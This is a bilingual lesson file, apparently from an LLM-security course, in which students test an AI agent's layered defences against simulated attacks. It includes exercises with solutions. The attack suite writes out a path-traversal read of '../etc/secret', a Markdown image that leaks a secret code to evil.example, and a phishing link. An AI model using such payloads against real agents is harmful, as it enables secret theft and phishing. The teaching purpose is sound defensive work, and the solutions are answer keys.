@@ -1,0 +1,459 @@
+# Niveau 19.boss — Défends ton agent (mission : évaluer une défense en couches et rendre un rapport honnête). Original academik ; notions des niveaux 19.1 à 19.5, vérifiées dans le Top 10 OWASP LLM 2025 (lien) et la spécification MCP (citée). Approche défensive, attaques simulées.
+id: 19.boss
+module: 19
+duree_min: 17
+titre:
+  fr: Défends ton agent
+  en: Defend your agent
+ia:
+  fr: Kintana résiste à une série d’attaques et rend un rapport qui dit ce qui passe encore.
+  en: Kintana withstands a series of attacks and returns a report saying what still gets through.
+sources:
+- titre: OWASP — Top 10 for LLM Applications (2025)
+  url: https://genai.owasp.org/llm-top-10/
+  licence: Lien seulement ; texte non repris
+- titre: Model Context Protocol — Security best practices
+  url: https://modelcontextprotocol.io/specification
+  licence: Spécification en ligne ; idées citées
+cartes:
+- id: c1
+  type: tentative
+  note:
+    kind: quiz
+    poids: 1
+  fr: 'Après avoir ajouté trois défenses à ton agent, tu le testes sur 6 attaques : 5 sont bloquées, une passe. Que mets-tu dans ton rapport de sécurité ?'
+  en: 'After adding three defences to your agent, you test it on 6 attacks: 5 are blocked, one gets through. What do you put in your security report?'
+  choix:
+  - fr: Les 5 blocages et l’attaque qui passe, avec les limites du test
+    en: The 5 blocks and the attack that gets through, with the test’s limits
+    juste: true
+  - fr: Seulement « 5 sur 6 », sans détail
+    en: Only “5 out of 6”, without detail
+  - fr: 'Rien : l’attaque qui passe est un détail'
+    en: 'Nothing: the attack that gets through is a detail'
+  indice:
+    fr: Un rapport honnête dit ce qui n’est pas couvert, pour que le lecteur ne se croie pas protégé à tort.
+    en: An honest report says what is not covered, so the reader does not wrongly feel protected.
+  explication:
+    fr: Un bon rapport nomme ce qui **passe encore**. Cacher la faille expose le lecteur à un faux sentiment de sécurité.
+    en: A good report names what **still gets through**. Hiding the flaw exposes the reader to a false sense of security.
+- id: c2
+  type: idee
+  fr: 'Mission : évaluer la défense de ton agent sur une suite de 6 attaques simulées. Chaque attaque est soit une **action d’outil** (contrôlée par `decision`), soit une **sortie** du modèle (contrôlée par `retirer_images` et `filtrer_sortie`). Une attaque est **bloquée** si les défenses la refusent ou modifient la sortie.'
+  en: 'Mission: evaluate your agent’s defence on a suite of 6 simulated attacks. Each attack is either a **tool action** (checked by `decision`) or a model **output** (checked by `retirer_images` and `filtrer_sortie`). An attack is **blocked** if the defences refuse it or modify the output.'
+  exemple:
+    fr: 'Une action légitime fait aussi partie de la suite : elle ne doit pas être bloquée (pas de faux positif).'
+    en: 'A legitimate action is also part of the suite: it must not be blocked (no false positive).'
+  figure:
+    kind: schema
+    lignes:
+    - titre:
+        fr: Évaluer la défense
+        en: Evaluating the defence
+      noeuds:
+      - fr: suite d’attaques
+        en: attack suite
+      - fr: défenses en couches
+        en: layered defences
+      - fr: bloquée ou non
+        en: blocked or not
+      - fr: rapport honnête
+        en: honest report
+        ton: ok
+    legende:
+      fr: 'Compter aussi les faux positifs : une défense qui bloque tout est inutilisable.'
+      en: 'Count false positives too: a defence that blocks everything is unusable.'
+- id: c3
+  type: exemple
+  titre:
+    fr: Un contrôle d’action
+    en: An action check
+  lang: python
+  etapes:
+  - code: |-
+      import posixpath
+      racine = "/data"
+      permissions = {"lire": "auto", "ecrire": "confirmer"}
+    fr: La zone autorisée et les droits.
+    en: The allowed zone and the rights.
+  - code: |-
+      action = {"outil": "lire", "chemin": "../etc/secret"}
+      complet = posixpath.normpath(posixpath.join(racine, action["chemin"]))
+    fr: On normalise le chemin demandé.
+    en: We normalise the requested path.
+  - code: print(complet, complet.startswith(racine + "/"))
+    fr: 'On affiche `/etc/secret False` : l’action sort de la zone, elle sera refusée.'
+    en: 'We display `/etc/secret False`: the action leaves the zone, it will be refused.'
+  verif: |-
+    import posixpath
+    racine = "/data"
+    permissions = {"lire": "auto", "ecrire": "confirmer"}
+    action = {"outil": "lire", "chemin": "../etc/secret"}
+    complet = posixpath.normpath(posixpath.join(racine, action["chemin"]))
+    print(complet, complet.startswith(racine + "/"))
+  sortie: /etc/secret False
+- id: c4
+  type: code
+  note:
+    kind: exercise
+    poids: 1
+  fr: 'À toi. **Écris `bloque(attaque)`** : si l’attaque a une clé `"action"`, renvoie `True` quand `decision(outil, args, PERMISSIONS, RACINE)` vaut `"refuser"`. Sinon (une `"sortie"`), calcule `nettoye = filtrer_sortie(retirer_images(texte, HOTES), ["code-1234"])` et renvoie `True` si `nettoye` diffère de `texte`. Toutes les défenses sont fournies.'
+  en: 'Your turn. **Write `bloque(attaque)`**: if the attack has an `"action"` key, return `True` when `decision(outil, args, PERMISSIONS, RACINE)` is `"refuser"`. Otherwise (an `"sortie"`), compute `nettoye = filtrer_sortie(retirer_images(texte, HOTES), ["code-1234"])` and return `True` if `nettoye` differs from `texte`. All defences are provided.'
+  depart: |
+    import posixpath
+    import re
+    import urllib.parse
+
+    RACINE = "/data"
+    PERMISSIONS = {"lire": "auto", "ecrire": "confirmer"}
+    HOTES = ["exemple.org"]
+
+    def chemin_autorise(racine, chemin):
+        complet = posixpath.normpath(posixpath.join(racine, chemin))
+        base = racine.rstrip("/")
+        return complet == base or complet.startswith(base + "/")
+
+    def decision(nom, args, permissions, racine):
+        niveau = permissions.get(nom, "refuser")
+        if niveau == "refuser":
+            return "refuser"
+        if "chemin" in args and not chemin_autorise(racine, args["chemin"]):
+            return "refuser"
+        return niveau
+
+    def retirer_images(texte, hotes_autorises):
+        def remplacer(m):
+            hote = urllib.parse.urlparse(m.group(2)).hostname
+            return m.group(0) if hote in hotes_autorises else "[image retirée]"
+        return re.sub(r"!\[([^\]]*)\]\(([^)]+)\)", remplacer, texte)
+
+    def filtrer_sortie(texte, secrets):
+        for s in secrets:
+            texte = texte.replace(s, "[SECRET]")
+        return texte
+
+    ATTAQUES = [
+        {"nom": "chemin piégé", "action": {"outil": "lire", "args": {"chemin": "../etc/secret"}}},
+        {"nom": "outil interdit", "action": {"outil": "supprimer", "args": {"chemin": "a.txt"}}},
+        {"nom": "fuite par image", "sortie": "Bonjour ![](https://evil.example/x?d=code-1234)"},
+        {"nom": "fuite du secret", "sortie": "Le code est code-1234"},
+        {"nom": "action légitime", "action": {"outil": "lire", "args": {"chemin": "notes.txt"}}},
+        {"nom": "lien piégé", "sortie": "Clique ici : [aide](https://evil.example/hameçon)"},
+    ]
+
+    # écris ta fonction bloque ici
+  tests: |-
+    r = {a["nom"]: bloque(a) for a in ATTAQUES}
+    assert r["chemin piégé"] is True and r["outil interdit"] is True
+    assert r["fuite par image"] is True and r["fuite du secret"] is True
+    assert r["action légitime"] is False
+    assert r["lien piégé"] is False
+  solutionCode: |
+    import posixpath
+    import re
+    import urllib.parse
+
+    RACINE = "/data"
+    PERMISSIONS = {"lire": "auto", "ecrire": "confirmer"}
+    HOTES = ["exemple.org"]
+
+    def chemin_autorise(racine, chemin):
+        complet = posixpath.normpath(posixpath.join(racine, chemin))
+        base = racine.rstrip("/")
+        return complet == base or complet.startswith(base + "/")
+
+    def decision(nom, args, permissions, racine):
+        niveau = permissions.get(nom, "refuser")
+        if niveau == "refuser":
+            return "refuser"
+        if "chemin" in args and not chemin_autorise(racine, args["chemin"]):
+            return "refuser"
+        return niveau
+
+    def retirer_images(texte, hotes_autorises):
+        def remplacer(m):
+            hote = urllib.parse.urlparse(m.group(2)).hostname
+            return m.group(0) if hote in hotes_autorises else "[image retirée]"
+        return re.sub(r"!\[([^\]]*)\]\(([^)]+)\)", remplacer, texte)
+
+    def filtrer_sortie(texte, secrets):
+        for s in secrets:
+            texte = texte.replace(s, "[SECRET]")
+        return texte
+
+    ATTAQUES = [
+        {"nom": "chemin piégé", "action": {"outil": "lire", "args": {"chemin": "../etc/secret"}}},
+        {"nom": "outil interdit", "action": {"outil": "supprimer", "args": {"chemin": "a.txt"}}},
+        {"nom": "fuite par image", "sortie": "Bonjour ![](https://evil.example/x?d=code-1234)"},
+        {"nom": "fuite du secret", "sortie": "Le code est code-1234"},
+        {"nom": "action légitime", "action": {"outil": "lire", "args": {"chemin": "notes.txt"}}},
+        {"nom": "lien piégé", "sortie": "Clique ici : [aide](https://evil.example/hameçon)"},
+    ]
+
+    def bloque(attaque):
+        if "action" in attaque:
+            a = attaque["action"]
+            return decision(a["outil"], a["args"], PERMISSIONS, RACINE) == "refuser"
+        texte = attaque["sortie"]
+        nettoye = filtrer_sortie(retirer_images(texte, HOTES), ["code-1234"])
+        return nettoye != texte
+  indice:
+    fr: 'Deux branches : `if "action" in attaque` avec la `decision`, sinon le nettoyage de la `sortie` comparé au texte d’origine.'
+    en: 'Two branches: `if "action" in attaque` with the `decision`, otherwise the cleaning of the `sortie` compared with the original text.'
+  explication:
+    fr: 'Remarque : l’attaque « lien piégé » n’est **pas** bloquée, car aucune défense ne regarde les liens cliquables.'
+    en: 'Note: the “trapped link” attack is **not** blocked, because no defence looks at clickable links.'
+- id: c5
+  type: saisie
+  note:
+    kind: exercise
+    poids: 1
+  fr: Sur la suite de 6 attaques, une seule est une action légitime, qui ne doit pas être bloquée. Combien d’attaques **réelles** (à bloquer) la suite contient-elle ?
+  en: In the suite of 6 attacks, only one is a legitimate action, which must not be blocked. How many **real** attacks (to block) does the suite contain?
+  reponses:
+  - '5'
+  verif: print(6 - 1)
+  indice:
+    fr: Retire l’action légitime du total.
+    en: Subtract the legitimate action from the total.
+  explication:
+    fr: $6-1=5$ attaques réelles, dont tu as défendu 4.
+    en: $6-1=5$ real attacks, of which you defended 4.
+- id: c6
+  type: idee
+  fr: '**Faux positifs et faux négatifs.** Un **faux négatif** est une attaque qui passe. Un **faux positif** est une action légitime bloquée à tort. Une défense qui bloque tout n’a aucun faux négatif mais est inutilisable. On mesure les deux, comme au module 9.'
+  en: '**False positives and false negatives.** A **false negative** is an attack that gets through. A **false positive** is a legitimate action wrongly blocked. A defence that blocks everything has no false negatives but is unusable. We measure both, as in module 9.'
+  exemple:
+    fr: 'Ici : 1 faux négatif (le lien piégé) et 0 faux positif (la lecture légitime passe).'
+    en: 'Here: 1 false negative (the trapped link) and 0 false positives (the legitimate read passes).'
+- id: c6b
+  type: idee
+  fr: 'Une défense se juge sur trois critères : le **taux de blocage** des vraies attaques, le **taux de faux positifs** et le **coût** pour l’utilisateur. Une sécurité insupportable est contournée.'
+  en: 'A defence is judged on three criteria: the **blocking rate** of real attacks, the **false positive rate** and the **cost** to the user. Unbearable security gets bypassed.'
+  exemple:
+    fr: Un agent qui demande confirmation à chaque lecture de fichier finira par être désactivé par ses utilisateurs.
+    en: An agent that asks for confirmation for each file read will end up disabled by its users.
+  figure:
+    kind: tableau
+    entetes:
+    - fr: Critère
+      en: Criterion
+    - fr: Mesure
+      en: Measure
+    cellules:
+    - - fr: blocage
+        en: blocking
+      - fr: attaques arrêtées / attaques
+        en: attacks stopped / attacks
+    - - fr: faux positifs
+        en: false positives
+      - fr: actions légitimes bloquées
+        en: legitimate actions blocked
+    - - fr: coût
+        en: cost
+        ton: ok
+      - fr: gêne pour l’utilisateur
+        en: nuisance to the user
+        ton: ok
+    legende:
+      fr: Une bonne défense équilibre les trois.
+      en: A good defence balances the three.
+- id: c7
+  type: code
+  note:
+    kind: exercise
+    poids: 1
+  fr: '**Écris `rapport(attaques)`** : renvoie `{"total": n, "bloquees": b, "passent": [...]}`. Ici `n` est le nombre d’attaques, `b` le nombre pour lesquelles `bloque` vaut `True`, et `passent` la liste des **noms** des attaques non bloquées. `bloque` est fournie.'
+  en: '**Write `rapport(attaques)`**: return `{"total": n, "bloquees": b, "passent": [...]}`. Here `n` is the number of attacks, `b` the number for which `bloque` is `True`, and `passent` the list of **names** of unblocked attacks. `bloque` is provided.'
+  depart: |
+    import posixpath
+    import re
+    import urllib.parse
+
+    RACINE = "/data"
+    PERMISSIONS = {"lire": "auto", "ecrire": "confirmer"}
+    HOTES = ["exemple.org"]
+
+    def chemin_autorise(racine, chemin):
+        complet = posixpath.normpath(posixpath.join(racine, chemin))
+        base = racine.rstrip("/")
+        return complet == base or complet.startswith(base + "/")
+
+    def decision(nom, args, permissions, racine):
+        niveau = permissions.get(nom, "refuser")
+        if niveau == "refuser":
+            return "refuser"
+        if "chemin" in args and not chemin_autorise(racine, args["chemin"]):
+            return "refuser"
+        return niveau
+
+    def retirer_images(texte, hotes_autorises):
+        def remplacer(m):
+            hote = urllib.parse.urlparse(m.group(2)).hostname
+            return m.group(0) if hote in hotes_autorises else "[image retirée]"
+        return re.sub(r"!\[([^\]]*)\]\(([^)]+)\)", remplacer, texte)
+
+    def filtrer_sortie(texte, secrets):
+        for s in secrets:
+            texte = texte.replace(s, "[SECRET]")
+        return texte
+
+    ATTAQUES = [
+        {"nom": "chemin piégé", "action": {"outil": "lire", "args": {"chemin": "../etc/secret"}}},
+        {"nom": "outil interdit", "action": {"outil": "supprimer", "args": {"chemin": "a.txt"}}},
+        {"nom": "fuite par image", "sortie": "Bonjour ![](https://evil.example/x?d=code-1234)"},
+        {"nom": "fuite du secret", "sortie": "Le code est code-1234"},
+        {"nom": "action légitime", "action": {"outil": "lire", "args": {"chemin": "notes.txt"}}},
+        {"nom": "lien piégé", "sortie": "Clique ici : [aide](https://evil.example/hameçon)"},
+    ]
+
+    def bloque(attaque):
+        if "action" in attaque:
+            a = attaque["action"]
+            return decision(a["outil"], a["args"], PERMISSIONS, RACINE) == "refuser"
+        texte = attaque["sortie"]
+        nettoye = filtrer_sortie(retirer_images(texte, HOTES), ["code-1234"])
+        return nettoye != texte
+
+    # écris ta fonction rapport ici
+  tests: |-
+    r = rapport(ATTAQUES)
+    assert r["total"] == 6 and r["bloquees"] == 4
+    assert r["passent"] == ["action légitime", "lien piégé"]
+    assert rapport([]) == {"total": 0, "bloquees": 0, "passent": []}
+  solutionCode: |
+    import posixpath
+    import re
+    import urllib.parse
+
+    RACINE = "/data"
+    PERMISSIONS = {"lire": "auto", "ecrire": "confirmer"}
+    HOTES = ["exemple.org"]
+
+    def chemin_autorise(racine, chemin):
+        complet = posixpath.normpath(posixpath.join(racine, chemin))
+        base = racine.rstrip("/")
+        return complet == base or complet.startswith(base + "/")
+
+    def decision(nom, args, permissions, racine):
+        niveau = permissions.get(nom, "refuser")
+        if niveau == "refuser":
+            return "refuser"
+        if "chemin" in args and not chemin_autorise(racine, args["chemin"]):
+            return "refuser"
+        return niveau
+
+    def retirer_images(texte, hotes_autorises):
+        def remplacer(m):
+            hote = urllib.parse.urlparse(m.group(2)).hostname
+            return m.group(0) if hote in hotes_autorises else "[image retirée]"
+        return re.sub(r"!\[([^\]]*)\]\(([^)]+)\)", remplacer, texte)
+
+    def filtrer_sortie(texte, secrets):
+        for s in secrets:
+            texte = texte.replace(s, "[SECRET]")
+        return texte
+
+    ATTAQUES = [
+        {"nom": "chemin piégé", "action": {"outil": "lire", "args": {"chemin": "../etc/secret"}}},
+        {"nom": "outil interdit", "action": {"outil": "supprimer", "args": {"chemin": "a.txt"}}},
+        {"nom": "fuite par image", "sortie": "Bonjour ![](https://evil.example/x?d=code-1234)"},
+        {"nom": "fuite du secret", "sortie": "Le code est code-1234"},
+        {"nom": "action légitime", "action": {"outil": "lire", "args": {"chemin": "notes.txt"}}},
+        {"nom": "lien piégé", "sortie": "Clique ici : [aide](https://evil.example/hameçon)"},
+    ]
+
+    def bloque(attaque):
+        if "action" in attaque:
+            a = attaque["action"]
+            return decision(a["outil"], a["args"], PERMISSIONS, RACINE) == "refuser"
+        texte = attaque["sortie"]
+        nettoye = filtrer_sortie(retirer_images(texte, HOTES), ["code-1234"])
+        return nettoye != texte
+
+    def rapport(attaques):
+        bloquees = [a["nom"] for a in attaques if bloque(a)]
+        passent = [a["nom"] for a in attaques if not bloque(a)]
+        return {"total": len(attaques), "bloquees": len(bloquees), "passent": passent}
+  indice:
+    fr: 'Deux listes : les noms des attaques bloquées et ceux des non bloquées ; `len` donne les nombres.'
+    en: 'Two lists: the names of blocked attacks and those not blocked; `len` gives the numbers.'
+  explication:
+    fr: La liste des attaques qui passent contient ici la lecture légitime (normal) et le lien piégé (un vrai trou).
+    en: The list of attacks that pass here contains the legitimate read (normal) and the trapped link (a real hole).
+- id: c8
+  type: piege
+  fr: 'Ne confonds pas « bloquée » et « sans danger ». Une suite d’attaques ne couvre que celles que **tu** as imaginées. Un attaquant en inventera d’autres : encodages, langues, chaînes d’étapes. Un rapport honnête précise la **portée** du test et ne promet jamais « agent sûr ».'
+  en: 'Do not confuse “blocked” with “harmless”. A suite of attacks covers only those that **you** imagined. An attacker will invent others: encodings, languages, chains of steps. An honest report specifies the test’s **scope** and never promises “safe agent”.'
+- id: c9
+  type: idee
+  fr: 'Pour boucher le trou du **lien piégé**, on retire les liens vers un hôte non autorisé, comme pour les images. Chaque faille découverte devient un **test de non-régression** : l’attaque rejoint la suite pour toujours.'
+  en: 'To plug the **trapped link** hole, we remove links to an unauthorised host, as for images. Each flaw discovered becomes a **regression test**: the attack joins the suite forever.'
+  exemple:
+    fr: Une suite d’attaques qui grossit à chaque incident est la mémoire de sécurité de l’équipe.
+    en: An attack suite that grows with each incident is the team’s security memory.
+- id: c10
+  type: code
+  defi: true
+  note:
+    kind: quiz
+    poids: 2
+  fr: 'Défi final. **Écris `retirer_liens(texte, hotes_autorises)`** : remplace chaque lien Markdown `[texte](url)` (mais pas une image `![…](…)`) dont l’hôte n’est pas dans `hotes_autorises` par `"[lien retiré]"`. Indice : `re.sub(r"(?<!!)\[([^\]]*)\]\(([^)]+)\)", remplacer, texte)`.'
+  en: 'Final challenge. **Write `retirer_liens(texte, hotes_autorises)`**: replace each Markdown link `[text](url)` (but not an image `![…](…)`) whose host is not in `hotes_autorises` with `"[lien retiré]"`. Hint: `re.sub(r"(?<!!)\[([^\]]*)\]\(([^)]+)\)", remplacer, texte)`.'
+  depart: |
+    import re
+    import urllib.parse
+
+    # écris ta fonction retirer_liens ici
+  tests: |-
+    t = "Voir [aide](https://exemple.org/a) ou [piège](https://evil.example/x) ou ![img](https://evil.example/i)"
+    r = retirer_liens(t, ["exemple.org"])
+    assert r == "Voir [aide](https://exemple.org/a) ou [lien retiré] ou ![img](https://evil.example/i)"
+    assert retirer_liens("rien", []) == "rien"
+    assert retirer_liens("[a](https://x.org/)", ["x.org"]) == "[a](https://x.org/)"
+  solutionCode: |
+    import re
+    import urllib.parse
+
+    def retirer_liens(texte, hotes_autorises):
+        def remplacer(m):
+            hote = urllib.parse.urlparse(m.group(2)).hostname
+            return m.group(0) if hote in hotes_autorises else "[lien retiré]"
+        return re.sub(r"(?<!!)\[([^\]]*)\]\(([^)]+)\)", remplacer, texte)
+  indice:
+    fr: Même structure que `retirer_images`, avec l’expression `(?<!!)` qui exclut les images (précédées de `!`).
+    en: Same structure as `retirer_images`, with the expression `(?<!!)` that excludes images (preceded by `!`).
+  explication:
+    fr: 'Tu as comblé le trou du rapport : à ajouter à `bloque`, la suite passe à 5 attaques bloquées sur 5 réelles.'
+    en: 'You filled the report’s hole: added to `bloque`, the suite goes to 5 attacks blocked out of 5 real ones.'
+- id: c11
+  type: saisie
+  note:
+    kind: exercise
+    poids: 1
+  fr: Si on ajoute `retirer_liens` à `bloque`, l’attaque « lien piégé » devient bloquée. Combien d’attaques de la suite sont alors bloquées (sur 6, l’action légitime restant non bloquée) ?
+  en: If we add `retirer_liens` to `bloque`, the “trapped link” attack becomes blocked. How many attacks of the suite are then blocked (out of 6, the legitimate action remaining unblocked)?
+  reponses:
+  - '5'
+  verif: print(4 + 1)
+  indice:
+    fr: Il y en avait 4 de bloquées, plus le lien piégé.
+    en: There were 4 blocked, plus the trapped link.
+  explication:
+    fr: '$4+1=5$ : toutes les attaques réelles, et la lecture légitime reste autorisée.'
+    en: '$4+1=5$: all the real attacks, and the legitimate read remains allowed.'
+- id: c12
+  type: idee
+  fr: 'Tu as parcouru la sécurité des applications LLM : réseaux, cryptographie, programmation sûre, risques OWASP, injection de prompt et défense en profondeur. Une règle les résume : **ne jamais faire confiance à ce qui vient du dehors, et limiter ce qu’un composant peut faire s’il est trompé**.'
+  en: 'You have covered the security of LLM applications: networks, cryptography, safe programming, OWASP risks, prompt injection and defence in depth. One rule sums them up: **never trust what comes from outside, and limit what a component can do if it is tricked**.'
+  exemple:
+    fr: Le module 20 ajoute l’évaluation, la surveillance et le déploiement pour finir la chaîne de production.
+    en: Module 20 adds evaluation, monitoring and deployment to finish the production chain.
+- id: c13
+  type: retenir
+  fr: 'Évaluer la défense : suite d’attaques fixe, bloquées et passantes, faux positifs et faux négatifs. Rapport honnête avec la portée. Chaque faille devient un test. Pas de confiance au dehors, privilèges minimaux.'
+  en: 'Evaluating the defence: fixed attack suite, blocked and passing, false positives and false negatives. Honest report with the scope. Each flaw becomes a test. No trust outside, minimal privileges.'
+- id: c14
+  type: plus
+  fr: Pour aller plus loin, consulte [le Top 10 OWASP pour les applications LLM](https://genai.owasp.org/llm-top-10/) ; cette page demande une connexion.
+  en: To go further, see [the OWASP Top 10 for LLM applications](https://genai.owasp.org/llm-top-10/); this page needs a connection.
